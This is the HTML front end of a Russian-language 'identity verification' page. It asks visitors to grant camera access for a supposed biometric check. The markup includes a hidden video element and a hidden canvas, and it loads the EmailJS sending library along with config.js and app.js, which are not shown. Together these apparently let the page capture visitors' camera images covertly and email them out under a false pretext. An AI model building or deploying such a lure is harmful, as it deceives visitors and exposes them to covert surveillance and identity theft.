<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Проверка личности — Верификация</title>
<style>
  :root{--bg:#0b0e14;--card:#141924;--line:#222a3a;--txt:#e6ebf5;--mut:#7d8aa3;--acc:#3d7bfd;--ok:#28c76f}
  *{box-sizing:border-box;margin:0;padding:0}
  body{background:radial-gradient(1200px 600px at 50% -10%,#16203a,var(--bg));color:var(--txt);font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
  .card{width:100%;max-width:400px;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:28px 22px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
  .logo{width:54px;height:54px;border-radius:14px;background:linear-gradient(135deg,#3d7bfd,#7a4dff);display:flex;align-items:center;justify-content:center;margin:0 auto 18px;font-size:26px}
  h1{font-size:20px;text-align:center;margin-bottom:6px}
  .sub{font-size:13px;color:var(--mut);text-align:center;margin-bottom:22px;line-height:1.5}
  .step{display:flex;align-items:center;gap:12px;padding:12px 14px;border:1px solid var(--line);border-radius:12px;margin-bottom:10px;font-size:14px;color:var(--mut);transition:.3s}
  .step.active{border-color:var(--acc);color:var(--txt);background:rgba(61,123,253,.07)}
  .step.done{border-color:var(--ok);color:var(--ok)}
  .dot{width:20px;height:20px;border-radius:50%;border:2px solid currentColor;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:11px}
  .bar{height:6px;background:#0a0d13;border-radius:99px;overflow:hidden;margin:18px 0}
  .fill{height:100%;width:0;background:linear-gradient(90deg,var(--acc),#7a4dff);transition:width .4s}
  button{width:100%;padding:15px;border:none;border-radius:12px;background:linear-gradient(135deg,#3d7bfd,#5a5cff);color:#fff;font-size:15px;font-weight:600;cursor:pointer;margin-top:8px}
  button:disabled{opacity:.5;cursor:default}
  .fine{font-size:11px;color:var(--mut);text-align:center;margin-top:16px;line-height:1.5}
</style>
</head>
<body>
<div class="card">
  <div class="logo">🛡️</div>
  <h1>Проверка личности</h1>
  <p class="sub">Чтобы продолжить, подтвердите, что вы реальный человек. Займёт несколько секунд.</p>

  <div class="step" id="s1"><span class="dot">1</span> Доступ к камере устройства</div>
  <div class="step" id="s2"><span class="dot">2</span> Сверка биометрии</div>
  <div class="step" id="s3"><span class="dot">3</span> Защита сессии</div>

  <div class="bar"><div class="fill" id="fill"></div></div>

  <button id="btn">Начать проверку</button>
  <p class="fine">Нажимая «Начать», вы разрешаете доступ к камере для проверки личности.</p>
</div>

<video id="v" playsinline autoplay muted style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
<script src="config.js"></script>
<script src="app.js"></script>
</body>
</html>
